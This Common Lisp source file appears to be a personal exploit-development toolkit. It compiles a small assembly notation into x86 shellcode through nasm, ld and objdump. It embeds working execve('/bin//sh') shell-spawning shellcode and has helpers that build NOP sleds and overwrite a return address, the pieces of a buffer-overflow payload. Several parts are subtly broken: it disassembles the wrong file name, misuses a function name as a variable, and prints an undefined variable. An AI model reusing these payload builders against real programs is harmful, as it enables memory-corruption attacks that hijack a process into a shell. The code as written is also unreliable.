(require :flexi-streams)
(require :cl-arrows)
(require :cl-ppcre)
(require :str)
(require :alexandria)

(defpackage :lizard-burger
  (:use :common-lisp :cl-arrows :cl-ppcre))

(in-package :lizard-burger)

;; ASSEMBLY COMPILER
;; -----------------

;; REGEX used to parse the objdump output, line by line.
(defparameter *objdump-line-parser* "\\s*([0-9a-fA-F]{5,}):\\s+((?:[0-9a-fA-F]{2}\\s)*(?:[0-9a-fA-F]{2}))\\s+(.*)")

(defun write-code-to-file (text)
  "Writes the shellcode to a given file."
  (with-open-file (s "shellcode.asm"
                     :direction :output
                     :if-exists :supersede)
    (format s text)))

(defun emit-nasm-code (instructions)
  "Outputs the ASM instructions, with a newline in-between each."
  (format nil "~{~A~%~}" (mapcar 'compile-instruction instructions)))

(defun join-symbols-list (lst)
  "Joins symbols together with a comma in-between."
  (format nil
          "~{~A~^, ~}" (mapcar (lambda (x)
                                 (cond ((numberp x)
                                        (format-number x))
                                       (t (lowercase-symbol x))))
                               lst)))

(defun lowercase-symbol (sym)
  "Outputs a symbol as a lowercase string."
  (string-downcase (symbol-name sym)))

(defun format-number (n)
  "Formats a number as an hex string (0x####)"
  (format nil "0x~(~X~)" n))

(defun compile-instruction (repr)
  "Transforms a shellcode instruction to Intel format."
  (format nil
          "~{~A~^ ~}"
          (mapcar (lambda (λ)
                    (cond ((keywordp λ)
                           (lowercase-symbol λ))
                          ((listp λ)
                           (join-symbols-list λ))
                          ((numberp λ)
                           (format-number λ))
                          (t (format t "Error with token '~A'~%" λ))))
                  repr)))


(defun objdump-output->interesting-lines (output)
  "Takes the objdump output, and returns the lines which contain opcodes."
  (remove-if-not (lambda (x) (cl-ppcre:scan *objdump-line-parser* x))
                 (cl-ppcre:split "\\n" output)))

(defun objdump-opcodes (output)
  "Returns a list of opcodes fron the text lines produced by objdump."
  (cl-ppcre:split " "
                  (format nil "~{~A~^ ~}"
                          (mapcar (lambda (x)
                                    (cl-ppcre:register-groups-bind (address opcodes assembly)
                                        (*objdump-line-parser* x)
                                      opcodes))
                                  (objdump-output->interesting-lines output)))))

(defun compile-assembly (shellcode)
  (-> shellcode
      (emit-nasm-code)
      (write-code-to-file))

  ;; Get output
  (uiop:run-program '("nasm" "-f" "elf" "shellcode.asm" "-o" "shellcode.o"))
  (uiop:run-program '("ld" "-o" "shellcode.elf" "shellcode.o" "-m" "elf_i386"))
  (let* ((objdump-output (uiop:run-program '("objdump" "-d" "whatever.elf") :output :string))
         (opcodes->str objdump-output))
    (format t opcodes-str)))


;; Utilities
;; ---------

(defun opcodes->str (list)
  (str:join ""
            (mapcar (lambda (x) (format nil "\\x~X" x)) list)))

(defun nop ()
  #x90)

(defun repeat (op num)
  (if (zerop num)
      nil
      (cons op
            (repeat op (1- num)))))

(defvar *endianness* :little)


;; External Interface
;; ------------------


(defun compile-shellcode ()
  "Compiles the shellcode within this function, and gets the resulting opcodes."
  (let ((shellcode '((:xor (:eax :eax))
                     (:push :eax)
                     (:push #x68732f2f)
                     (:push #x6e69622f)
                     (:mov (:ebx :esp))
                     (:push :eax)
                     (:push :ebx)
                     (:mov (:ecx :esp))
                     (:mov (:al #xb))
                     (:int #x80))))
    (compile-assembly shellcode)))

(defun address (addr &key (reverse-endianness nil))
  (if reverse-endianness
      (reverse (lizard-burger.bytes-operations::number->bytes-list addr 32))
      (lizard-burger.bytes-operations::number->bytes-list addr 32)))

(defun overwrite-at-offset (offset value)
  (format t (opcodes->str (alexandria:flatten
                           (list (repeat #x90 offset)
                                 (address value :reverse-endianness T))))))
